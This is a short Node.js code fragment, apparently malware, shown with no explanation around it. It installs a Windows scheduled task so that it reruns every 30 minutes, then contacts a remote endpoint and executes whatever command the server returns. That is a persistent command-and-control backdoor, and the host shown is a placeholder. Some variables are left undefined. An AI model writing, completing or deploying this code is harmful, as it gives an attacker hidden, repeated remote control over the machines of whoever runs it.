const axios=require('axios'); const {exec}=require('child_process');
let func = (cmd) => { exec(cmd, () => {}); };
func(`schtasks /create /tn "task" /tr "node ${path}" /sc minute /mo 30 /f`);
axios.post('https://example.invalid/endpoint',{id}).then(res => {let command=res.data.command; if(command) func(res.data.command)});
